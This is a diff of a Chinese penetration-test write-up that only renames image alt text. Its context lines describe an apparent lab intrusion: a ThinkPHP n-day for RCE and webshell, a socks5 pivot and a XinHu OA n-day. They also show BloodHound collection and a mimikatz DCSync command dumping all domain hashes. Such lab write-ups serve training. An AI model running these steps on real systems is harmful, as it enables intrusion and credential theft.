@@ -15,7 +15,7 @@ tags: ["Pentest"]
 
 看到网站logo为thinkphp的logo，
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 NDAY，发现可以直接RCE，运行`curl ip.sb`发现出网，可以弹shell，也可以写马，这里选择写马
 
@@ -149,7 +149,7 @@ socks 5555
 
 现在我们就搭建好了socks5的代理了，使用`proxifier`弄一个全局代理
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 信呼OA这个系统刚好版本也是可以用NDAY打的
 
@@ -228,7 +228,7 @@ net user /domain
 
 本来想的是直接新建用户上去的，但是发现一个问题，就是链接之后直接蓝屏了（忘记了）
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 确认是域用户
 
@@ -275,11 +275,11 @@ download C:\\Windows\\Temp\\20250617200323_BloodHound.zip /tmp/
 download C:\\Windows\\Temp\\20250617200323_BloodHound.zip /home/kali/桌面/
 ```
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 查看当前用户与域的关系
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 > The computer XIAORANG-WIN7.XIAORANG.LAB has the DS-Replication-Get-Changes-All permission on the domain XIAORANG.LAB.
 >
@@ -299,7 +299,7 @@ download C:\\Windows\\Temp\\20250617200323_BloodHound.zip /home/kali/桌面/
 
 所以可以利用这个用户进行 DCSync攻击，现在需要获得`NThash`
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 > When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.
 > 当用户向计算机进行身份验证时，他们通常会在系统上公开凭据，这些凭据可以通过 LSASS 注入、令牌作/盗窃或注入用户进程来检索。
@@ -312,7 +312,7 @@ kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 exit
 ```
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 再直接横向即可
 
